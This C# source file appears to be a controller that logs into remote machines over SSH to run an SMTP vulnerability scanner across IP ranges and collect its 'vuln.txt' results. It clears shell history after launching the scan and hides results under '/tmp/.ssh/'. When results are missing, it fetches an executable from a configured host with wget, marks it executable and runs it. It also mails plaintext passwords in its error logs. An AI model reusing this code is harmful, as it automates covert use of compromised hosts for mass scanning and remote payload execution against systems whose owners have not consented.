using System;
using System.Configuration;
using System.IO;
using System.Threading;
using NLog;
using Renci.SshNet;
using SmtpWindowsService.Interfaces;
using SmtpWindowsService.Models;

namespace SmtpWindowsService.Methods
{

    public class SshAuth : ISshAuth
    {
        private static object locker = new object();
        private static Logger logger = LogManager.GetCurrentClassLogger();
        private IEmailService _emailService = new EmailService();

        public override void AuthAndStart(string hostnameOrIp, string username, string password, ScanIp item)
        {
            SmtpScanCommands(hostnameOrIp, username, password, item);
        }

        private void SmtpScanCommands(string hostnameOrIp, string username, string password, ScanIp item)
        {
            var appName = "SMTP";
            string command1 = "cd" + " " + ConfigurationManager.AppSettings["remoteSmtpDirectory"];
            string command2 = string.Format("nohup ./start {0}.{1} >> /dev/null &", item.AIp, item.BIp);
            string command3 = "history -c";
            ShellStream shell;
            StreamWriter writer;
            var sshclient = SshClientConnect(hostnameOrIp, username, password, out shell, out writer, appName);
            if (sshclient.IsConnected)
            {
                ExecuteCommand(shell, command1, writer);
                ExecuteCommand(shell, command2, writer);
                ExecuteCommand(shell, command3, writer);
                sshclient.Disconnect();
            }
        }

        public override SshClient SshClientConnect(string hostnameOrIp, string username, string password, out ShellStream shell,
            out StreamWriter writer, string appName)
        {
            SshClient sshclient = new SshClient(hostnameOrIp, username, password);
            try
            {
                sshclient.Connect();
                shell = sshclient.CreateShellStream("cmd.exe", 80, 24, 800, 600, 1024);
                writer = new StreamWriter(shell);
                writer.AutoFlush = true;
                while (!shell.DataAvailable)
                    Thread.Sleep(1000); //This wait period seems required
            }
            catch (Exception exception)
            {
                var messageError = string.Format("error connecting to host - {3} - {0} {1} {2} - {4}", hostnameOrIp, username,
                    password, appName,exception.Message);
                _emailService.LogNotConnected(messageError);
                shell = null;
                writer = null;
            }
            return sshclient;
        }

        public override void ExecuteCommand(ShellStream shell, string command, StreamWriter writer)
        {
            writer.WriteLine(command);
            while (!shell.DataAvailable)
                Thread.Sleep(1000); //This wait period seems required
        }

        public override void GetResults(string hostnameOrIp, string username, string password)
        {
            string command1 = ConfigurationManager.AppSettings["remoteSmtpDirectory"];
            string command4 = "vuln.txt";
            var localFile = ConfigurationManager.AppSettings["vulnLocal"];

            var remoteFile = command1 + "/" + command4;
            var tempLocalFile = ConfigurationManager.AppSettings["localDestinatonForTempVuln"];
            try
            {
                using (var sftp = new SftpClient(hostnameOrIp, 22, username, password))
                {
                    sftp.Connect();
                    if (sftp.IsConnected)
                    {
                        lock (locker)
                        {
                            if (sftp.Exists(remoteFile))
                            {
                                using (var file = File.OpenWrite(tempLocalFile))
                                {
                                    sftp.DownloadFile(remoteFile, file);
                                }
                            }
                            else
                            {
                                DownloadFolderToSsh(hostnameOrIp, username, password);
                                var messageError = string.Format("Download File - {0} {1} {2}", hostnameOrIp, username, password);
                                _emailService.LogNotConnected(messageError);
                            }
                        }
                    }
                    sftp.Disconnect();
                }
            }
            catch (Exception exception)
            {
                var messageError = string.Format("error connecting to host to get results - {0} {1} {2} - {3}", hostnameOrIp,
                    username, password,exception.Message);
                _emailService.LogNotConnected(messageError);
            }

            var res = File.ReadAllLines(tempLocalFile);
            File.AppendAllLines(localFile, res);
            string[] aa = DateTime.Now.ToString("HH:mm").Split(' ');
            File.WriteAllLines(tempLocalFile, aa);

            var command3 = string.Format("mv {2}/vuln.txt" + " " + "/tmp/.ssh/Smtp/{0}-{1}.txt",
                DateTime.Now.ToString("dd.MM.yyyy"), DateTime.Now.ToString("HH:mm"), command1);
            var command2 = string.Format("echo '{0}-{1}' >{2}/vuln.txt", DateTime.Now.ToString("dd.MM.yyyy"),
                DateTime.Now.ToString("HH:mm"), command1);
            ShellStream shell;
            StreamWriter writer;
            var appName = "SMTP";
            var sshclient = SshClientConnect(hostnameOrIp, username, password, out shell, out writer, appName);
            if (sshclient.IsConnected)
            {
                ExecuteCommand(shell, command3, writer);
                ExecuteCommand(shell, command2, writer);
                sshclient.Disconnect();
            }
        }

        public void DownloadFolderToSsh(string hostnameOrIp, string username, string password)
        {
            var remoteDirectory = ConfigurationManager.AppSettings["remoteDefaultDirectory"];
            var downloadHost = ConfigurationManager.AppSettings["downloadHost"];
            var appName = "SMTP";
            var command1 = string.Format("wget {0}/smt -P {1} && chmod +x {1}/smt && {1}/smt", downloadHost, remoteDirectory);
            ShellStream shell;
            StreamWriter writer;
            var sshclient = SshClientConnect(hostnameOrIp, username, password, out shell, out writer, appName);
            ExecuteCommand(shell, command1, writer);
            Thread.Sleep(20000);
            sshclient.Disconnect();
        }
    }
}
